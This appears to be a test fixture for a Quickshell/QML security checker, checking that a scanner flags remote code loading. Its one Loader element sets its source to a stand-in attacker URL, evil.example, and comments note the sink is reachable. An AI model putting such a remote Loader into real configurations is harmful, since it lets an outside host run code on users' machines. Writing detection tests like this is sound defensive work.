import QtQuick

Item {
    // R-1: a literal remote URL at a verified reachable load sink.
    // H0 2026-08-27: network Loader.source is REACHABLE on Quickshell 0.3.1-1.
    // Single-line spelling so the lexical fallback exercises the same sink.
    Loader { source: "https://evil.example/W.qml" }
}
